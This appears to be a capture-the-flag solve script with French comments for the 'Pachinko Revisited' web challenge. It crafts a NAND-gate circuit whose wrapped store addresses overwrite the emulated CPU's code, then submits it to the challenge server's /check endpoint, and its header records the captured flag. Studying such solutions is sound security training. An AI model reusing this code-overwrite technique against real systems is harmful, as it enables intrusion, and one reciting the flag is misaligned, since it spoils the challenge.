# 478 - Pachinko Revisited  (Web Exploitation, picoCTF 2025)
# Flag: academy{p4ch1nk0_r3v15173d_flag_two_a6c19d0d}
# Write-up: ../../../writeups/web-exploitation/478-pachinko.md
# This is the script that produced the flag; historical variants are in archive/.
#
"""478 Pachinko Revisited : exploit.

L'ISA du CPU Verilog a ete mesuree sur le .wasm (voir le writeup). Le point cle :

  nand_checker.bin ecrit son resultat NAND a  0x2000 + 2*out_node (mod 0x10000)

donc une porte dont le noeud de sortie vaut 0xf000 ecrit a l'adresse 0x0000-relative
du programme, soit : 0xf000+38 -> 0x4c, 0xf000+39 -> 0x4e, et ainsi de suite.

Plan : on detourne cette primitive de store du circuit NAND pour planter les dix mots
de flag.bin a 0x4c..0x5e, c'est-a-dire sur les instructions executees juste apres la
boucle de traitement des portes :
    load_imm r0,0x6f73 / r1,0x6563 / r2,0x2e69 / r3,0x6f00
    flag_magic
    halt
ces mots levent la sortie `flag` du CPU, donc /check repond FLAG2.

Usage : python3 solve.py <host> <port>
"""
import sys, json, requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()

HOST = sys.argv[1] if len(sys.argv) > 1 else "http://chatelaine.cylabacademy.net:15656"


# --------------------------------------------------------------------------
# Etape 1/4 : primitives de netlist
#   con  : constante 0/1 sur un noeud
#   num  : immediate 16 bits (chargee par 2 portes)
#   write: store du circuit NAND vers une adresse absolue
# --------------------------------------------------------------------------

def con(a, b, o):
    return {"input1": a, "input2": b, "output": o}


def num(n, const, dest):
    """Materialise the 16-bit constant n at circuit node `dest` using only NANDs."""
    r = []
    for bit in f"{n:0b}"[1:]:
        r.append(con(dest, dest, dest))          # dest = ~dest
        if bit == "1":
            r.append(con(0 + const, dest, dest))  # dest = ~(K & dest)
    return r


def write(base, node, n):
    """Emit gates that store the 16-bit value n through node `node` (0xf000+k)."""
    total = base - 4 + node.bit_length() + node.bit_count() + n.bit_length() + n.bit_count()
    total *= 3
    const = total + 3
    return [
        *num(node, 0x800 + const, 0x800 + total + 2),
        *num(n, 0x800 + const, 0x800 + const + 1),
        con(0xff0, 0x800 + const + 1, 1),
        con(1, 1, 1),
    ]


A, B = 0, 6
# --------------------------------------------------------------------------
# Etape 2/4 : construction du circuit
#   une porte dont le noeud de sortie vaut 0xf000 ecrit a l'adresse
#   0x2000 + 2*0xf000 mod 0x10000 = 0x0000, donc DANS le code du programme
#   les 3 portes qui precedent amenent le compteur de PC a la bonne case
# --------------------------------------------------------------------------

TARGET = A + 10 * 3
circ = [
    con(0xfff, 0xfff, 0xfff),
    con(0xfff, 0xfff, 0xfff),
    con(0x22, 0x101, 0x101),
    con(0x800 + A + 0, 0x800 + A + 1, 0x800 + TARGET + 2),
    con(0x800 + A + 2, 0x800 + A + 3, 0x800 + TARGET + 2),
    con(0x800 + A + 4, 0x800 + A + 5, 0x800 + TARGET + 2),
    con(0x800 + TARGET + 2, 0x800 + TARGET + 2, 0x800 + TARGET + 2),
    con(0x800 + B + 0, 0x800 + B + 0, 0x800 + B + 0),
    con(0x800 + TARGET + 2, 0x800 + B + 0, 0x800 + TARGET + 2),
    con(0x800 + B + 1, 0x800 + B + 1, 0x800 + B + 2),
    con(0x800 + B + 2, 0x800 + B + 2, 1),
]
# --------------------------------------------------------------------------
# Etape 3/4 : les dix mots de flag.bin
#   ils sont plantes a 0x4c..0x5e, juste apres la boucle de traitement
#   des portes, la ou le CPU va chercher ses prochaines instructions
# --------------------------------------------------------------------------

# flag.bin, one 16-bit word per instruction slot starting at code address 0x4c
for k, word in enumerate((0x0d, 0x6f73, 0x1d, 0x6563, 0x2d, 0x2e69,
                          0x3d, 0x6f00, 0x0e, 0x0f)):
    circ.extend(write(len(circ), 0xf000 + 38 + k, word))

# --------------------------------------------------------------------------
# Etape 4/4 : envoi a /check
#   le store a deja reecrit le code, le programme execute donc flag_magic + halt
#   et leve la sortie `flag` du CPU : la reponse contient FLAG2
# --------------------------------------------------------------------------

print("gates:", len(circ), " budget:", (0x10000 - 0x3000) // 6)
r = requests.post(HOST + "/check", json={"circuit": circ}, timeout=180)
print("status:", r.status_code)
print("body:", r.text[:600])
try:
    print("json:", r.json())
except Exception:
    pass
